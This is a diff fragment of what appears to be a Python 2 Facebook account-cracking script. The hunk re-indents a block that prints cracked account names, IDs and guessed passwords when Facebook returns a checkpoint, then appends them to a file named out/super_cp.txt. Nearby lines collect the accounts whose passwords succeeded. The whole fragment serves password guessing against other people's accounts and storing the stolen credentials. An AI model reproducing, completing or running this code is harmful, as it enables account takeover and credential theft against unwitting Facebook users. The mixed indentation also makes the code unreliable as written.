@@ -523,15 +523,15 @@ def pilih_super():
 														                                print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'	
 														                                oks.append(user+pass8)
 																	else:	
-																	if 'www.facebook.com' in q["error_msg"]:	
-															                print '\x1b[1;95m[  ✖ ] \x1b[1;95mCeckpoint'
-															                print '\x1b[1;95m[•⊱✿⊰•] \x1b[1;95mNama \x1b[1;95m    : \x1b[1;95m' + b['name']
-															                print '\x1b[1;95m[•⊱✿⊰•] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user
-															                print '\x1b[1;95m[•⊱✿⊰•] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass8 + '\n'
-															                cek = open("out/super_cp.txt", "a")
-															                cek.write("ID:" +user+ " Pw:" +pass8+"\n")
-															                cek.close()
-															                cekpoint.append(user+pass8)
+																	        if 'www.facebook.com' in q["error_msg"]:	
+															                                print '\x1b[1;95m[  ✖ ] \x1b[1;95mCeckpoint'
+															                                print '\x1b[1;95m[•⊱✿⊰•] \x1b[1;95mNama \x1b[1;95m    : \x1b[1;95m' + b['name']
+															                                print '\x1b[1;95m[•⊱✿⊰•] \x1b[1;95mID \x1b[1;95m      : \x1b[1;95m' + user
+															                                print '\x1b[1;95m[•⊱✿⊰•] \x1b[1;95mPassword \x1b[1;95m: \x1b[1;95m' + pass8 + '\n'
+															                                cek = open("out/super_cp.txt", "a")
+															                                cek.write("ID:" +user+ " Pw:" +pass8+"\n")
+															                                cek.close()
+															                                cekpoint.append(user+pass8)
 		except:
 			pass
 		
